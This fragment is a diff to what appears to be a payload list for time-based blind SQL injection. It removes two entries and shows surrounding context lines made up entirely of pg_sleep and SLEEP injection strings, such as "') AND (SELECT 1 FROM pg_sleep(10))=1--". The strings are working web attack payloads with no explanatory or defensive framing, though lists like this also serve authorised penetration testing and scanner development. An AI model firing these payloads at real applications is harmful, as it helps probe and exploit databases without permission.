@@ -16,7 +16,6 @@
 ')) || pg_sleep(10)--
 ') AND (SELECT 1 FROM pg_sleep(10))=1--
 ')); SELECT pg_sleep(10);--
-'||pg_sleep(10)--
 '||(pg_sleep(10))--
 "||pg_sleep(10)--
 ' OR SLEEP(10)--
@@ -83,4 +82,3 @@ test') OR SLEEP(10)--
 test%') OR SLEEP(10)--
 1 OR SLEEP(10)--
 -1 OR SLEEP(10)--
-1; SELECT pg_sleep(10)--
